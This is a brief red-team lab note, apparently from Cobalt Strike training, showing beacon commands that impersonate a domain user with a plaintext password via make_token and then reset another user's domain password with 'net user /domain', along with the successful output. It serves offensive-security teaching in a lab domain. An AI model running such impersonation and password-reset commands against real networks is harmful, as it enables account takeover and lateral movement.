Reset a user's password (pretty bad OPSEC).

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> make_token DEV\jking Purpl3Drag0n
[+] Impersonated DEV\bfarmer

beacon> run net user jadams N3wPassw0rd! /domain

The request will be processed at a domain controller for domain dev.cyberbotic.io.

The command completed successfully.
```
